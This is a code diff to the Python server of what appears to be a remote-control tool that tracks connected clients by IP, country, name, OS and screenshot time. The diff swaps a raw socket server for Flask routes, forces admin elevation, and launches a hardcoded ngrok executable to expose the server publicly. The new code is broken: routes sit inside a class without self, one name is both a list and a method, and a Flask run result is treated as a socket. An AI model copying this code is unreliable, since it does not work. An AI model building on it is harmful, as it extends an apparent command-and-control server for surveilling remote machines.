@@ -4,83 +4,78 @@ from threading import Thread
 from datetime import datetime
 from time import sleep
 import config
-import socket
+import requests
 import sys
 from pyngrok import ngrok
+import subprocess
+import requests
+import os
+import time
+from pyuac import main_requires_admin
+from flask import Flask, request, jsonify
 
+app = Flask(__name__)
+
+SERVER_ADDRESS = None  # Define SERVER_ADDRESS as a global variable
 
 class Server:
-    def __init__(self, ip, port):
-        """
-        Initiates the server
-        :param ip: ip address to host the server on
-        :param port: port to listen for connections on
-        """
-        config.log('Starting server on {}:{} ...'.format(ip, port))
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.bind((ip, port))
-        self.server_socket.listen()
-        config.log('Listening for clients...')
-
-    def close(self):
-        """ Closes the server """
-        self.server_socket.close()
-
-    @staticmethod
-    def send(sock, message):
-        """
-        Sends a message in small chunks to the client
-        :param sock: Client socket object
-        :param message: Message to send to the server (bytes/str)
-        """
-        message = message.encode() if type(message) != bytes else message
-        message = compress(message, level=6)  # Compress the sent data
-        if len(message) % config.BUFFER_SIZE == 0:
-            message = message + '.'.encode()
-        while message:
-            sock.send(message[:config.BUFFER_SIZE])
-            message = message[config.BUFFER_SIZE:]
-
-    @staticmethod
-    def receive(sock, as_bytes=False):
-        """
-        Receive a message in small chunks from the client
-        :param sock: Client socket object
-        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
-        """
-        chunk = sock.recv(config.BUFFER_SIZE)
-        data = chunk
-        while len(chunk) == config.BUFFER_SIZE:
-            sleep(0.001)  # To avoid receive overlap. A bit scuffed solution but it works.
-            chunk = sock.recv(config.BUFFER_SIZE)
-            if chunk != '.'.encode():
-                data += chunk
-
-        data = decompress(data)  # Decompress the received data
-        return data if as_bytes else data.decode(errors="ignore")
-
+    client_connections = []
     def client_connections(self):
-        """ Handles new connections and adds them to the client list. """
-        try:
-            while True:
-                (client_socket, addr) = self.server_socket.accept()
-                config.log('New connection from: ' + str(addr[0]))
-                client_data = self.receive(client_socket).split(',')  # IP,CountryCode,Name,OS
+        """
+        Accepts new client connections and adds them to the client list
+        """
+        while True:
+            client, address = self.server.accept()
+            config.log(f"Accepted a connection from {address[0]}:{address[1]}")
+            self.client_connections.append(client)
 
-                # Add new client to the clients list
-                exist = False
-                for client in config.client_list:
-                    if client['ip'] == addr[0]:
-                        exist = True
-                        break
-                if not exist:
-                    config.client_list.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket, 'last_screenshot_time': datetime(2000, 12, 1, 1, 1)}})
-        except socket.error as e:
-            config.log('Error: ' + str(e))
-            self.client_connections()
+    @app.route('/new_client', methods=['POST'])
+    def new_client():
+        """
+        Adds a new client to the client list
+        """
+        client_data = request.json
+        exist = False
+        for client in config.client_list:
+            if client['ip'] == client_data['ip']:
+                exist = True
+                break
+        if not exist:
+            config.client_list.append({'ip': client_data['ip'], 'data': client_data['data']})
+        return jsonify({'status': 'success'})
 
+    @app.route('/send', methods=['POST'])
+    def send_message():
+        """
+        Sends a message to the server
+        :param message: Message to send to the server (str)
+        """
+        global SERVER_ADDRESS  # Access the global variable
+        message = request.json['message']
+        url = f"{SERVER_ADDRESS}/send"
+        data = {"message": message}
+        response = requests.post(url, json=data)
+        if response.status_code != 200:
+            print(f"Failed to send message: {response.text}")
+        return jsonify({'status': 'success'})
 
+    @app.route('/receive', methods=['GET'])
+    def receive_message():
+        """
+        Receives a message from the server
+        :return: Message received from the server (str)
+        """
+        global SERVER_ADDRESS  # Access the global variable
+        url = f"{SERVER_ADDRESS}/receive"
+        response = requests.get(url)
+        if response.status_code != 200:
+            print(f"Failed to receive message: {response.text}")
+            return jsonify({'status': 'failed'})
+        return jsonify({'message': response.json()["message"]})
+
+@main_requires_admin
 def main():
+    global SERVER_ADDRESS  # Access the global variable
     # Default Server Parameters
     ip = 'localhost'
     port = 8000
@@ -101,21 +96,33 @@ def main():
                 config.log(str(e))
                 config.log('Inputted port number is invalid. Starting on default port')
 
-    # Start server
     try:
-        # Use ngrok to expose the server to the internet
-        public_url = ngrok.connect(port).public_url
+        # Start server
+        # Step 0: Save the default path
+        default_path = os.getcwd()
+        print(default_path)
+        # Step 1: cd into user's folder in Windows
+        os.chdir(os.path.expanduser("~"))
+        print("CD'd into user's folder in Windows")
+
+        # Step 2: Start ngrok to expose the server to the internet
+        ngrok_process = subprocess.Popen(["C:/Users/cyn0v/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "--host-header=rewrite", "8000"])
+        print("Started ngrok to expose the server to the internet")
+        time.sleep(2) # Give ngrok time to start up
+        # Get the public URL from ngrok output
+        public_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
         config.log(f'Server is now publicly accessible at {public_url}')
-        config.SERVER = Server(ip, port)  # Initiates the server
-        Thread(target=config.SERVER.client_connections, daemon=True).start()  # Thread to accept new connections
+        SERVER_ADDRESS = public_url  # Set the server address to the ngrok URL
+        server = Server()
+        server.server = app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+        Thread(target=server.client_connections, daemon=True).start()  # Thread to accept new connections
         start_gui()  # Start the GUI
-    except socket.gaierror as e:
+    except requests.exceptions.RequestException as e:
         config.log(str(e))
         config.log('Invalid IP address to host server on.')
     except OverflowError as e:
         config.log(str(e))
         config.log('Invalid Port number to host server on.')
-
 
 if __name__ == "__main__":
     main()
